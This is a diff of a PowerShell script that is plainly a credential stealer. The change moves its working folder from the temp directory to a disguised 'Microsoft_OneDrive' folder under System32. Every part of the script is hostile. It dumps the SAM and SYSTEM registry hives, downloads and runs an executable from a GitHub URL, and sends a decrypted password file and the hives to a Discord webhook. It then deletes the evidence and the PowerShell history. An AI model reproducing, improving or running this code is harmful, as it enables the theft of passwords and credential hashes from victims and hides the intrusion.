@@ -1,9 +1,9 @@
-cd $env:TMP
+cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
 reg save HKLM\sam ./sam.save
 reg save HKLM\system ./system.save
 
-iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $Env:TMP\d2.1.exe
-Start-process "$env:TMP\d2.1.exe"
+iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $Env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
+Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
 start-sleep 5
 function Upload-Discord {
 
@@ -27,13 +27,13 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-Upload-Discord -file $env:TMP\decrypted_password.csv
-Upload-Discord -file $env:TMP\sam.save
-Upload-Discord -file $env:TMP\system.save
-rm "$env:TMP\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\sam.save" -r -Force -ErrorAction SilentlyContinue
-rm "$env:TMP\system.save" -r -Force -ErrorAction SilentlyContinue
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 cls
 exit
